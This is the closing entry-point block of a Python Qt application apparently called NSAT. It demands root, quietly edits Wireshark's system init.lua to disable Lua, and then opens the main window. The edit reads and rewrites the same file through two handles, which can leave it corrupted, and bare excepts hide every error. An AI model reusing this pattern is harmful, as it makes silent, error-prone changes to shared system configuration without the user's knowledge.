if __name__ == "__main__":
    if not os.geteuid() == 0:
        sys.exit('NSAT must be run as root!')
    try:
        try:
            f1 = open('/usr/share/wireshark/init.lua', 'r+')
            f2 = open('/usr/share/wireshark/init.lua', 'r+')
            for line in f1:
                f2.write(line.replace('disable_lua = false', 'disable_lua = true'))
            f1.close()
            f2.close()
        except:
            pass
        app = QtWidgets.QApplication(sys.argv)
        MainWindow = QtWidgets.QMainWindow()
        ui = Ui_MainWindow()
        ui.setupUi(MainWindow)
        MainWindow.show()
        sys.exit(app.exec_())
    except:
        sys.exit()
